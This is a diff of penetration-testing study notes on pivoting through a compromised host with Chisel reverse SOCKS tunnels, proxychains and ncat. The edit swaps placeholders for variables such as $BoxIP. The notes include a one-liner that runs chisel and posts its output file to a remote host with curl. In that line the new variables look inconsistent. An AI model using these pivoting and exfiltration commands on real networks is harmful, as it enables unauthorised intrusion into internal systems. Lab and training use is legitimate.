@@ -25,12 +25,12 @@ sudo apt install chisel
 chisel server -p 8000 --reverse
 
 # On the compromised target, run the client, connecting back to Kali and opening a reverse SOCKS proxy
-./chisel client <kali_ip>:8000 R:socks
+./chisel client $LocalIP:8000 R:socks
 
 # SOCKS (Socket Secure) is a protocol that lets you route any TCP/UDP traffic through a proxy server;
 # once Chisel opens a SOCKS listener, proxychains forwards your tools' connections through it
 # Now route tools through the tunnel via proxychains, pointed at Chisel's local SOCKS listener (default 127.0.0.1:1080)
-proxychains nmap -sT -Pn <internal_target>
+proxychains nmap -sT -Pn $BoxIP
 ```
 *`--reverse` on the server side lets the target-side client initiate the connection outbound (works even when Kali can't reach the target directly, only the target can reach Kali), the more common real-world direction once you're behind a firewall. `R:socks` sets up a reverse dynamic SOCKS proxy specifically, other forwarding modes exist for single-port forwards instead of a full SOCKS proxy.*
 
@@ -50,7 +50,7 @@ chisel client -v <PIVOT_IP>:1234 socks
 
 → This opens SOCKS5 proxy on Kali's `127.0.0.1:1080`.
 → Update `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080`
-→ Then `proxychains nmap -sT -Pn -n <target>` as normal.
+→ Then `proxychains nmap -sT -Pn -n $BoxIP` as normal.
 
 **Comparison:**
 
@@ -73,7 +73,7 @@ See also [[Ligolo-ng]] for a TUN-interface-based alternative that skips `proxych
 ```bash
 sudo apt install ncat
 
-ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<internal-host>
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@$BoxIP
 # %h = SSH destination host  %p = SSH destination port (filled in by SSH at runtime)
 ```
 
@@ -94,7 +94,7 @@ gunzip chisel_1.8.1_linux_amd64.gz && chmod +x chisel_1.8.1
 
 Use the blind error-collection pattern to detect this without direct shell access:
 ```bash
-/tmp/chisel client <ip>:<port> R:socks &> /tmp/output; curl --data @/tmp/output http://<ip>:<port>/
+/tmp/chisel client $BoxIP:$Port R:socks &> /tmp/output; curl --data @/tmp/output http://$BoxIP:$Port/
 ```
 
 **General rule:** Any Go binary compiled with 1.20+ fails on glibc < 2.32. Always check the target's glibc version (`ldd --version`) if you control it, or use the older compiled release.
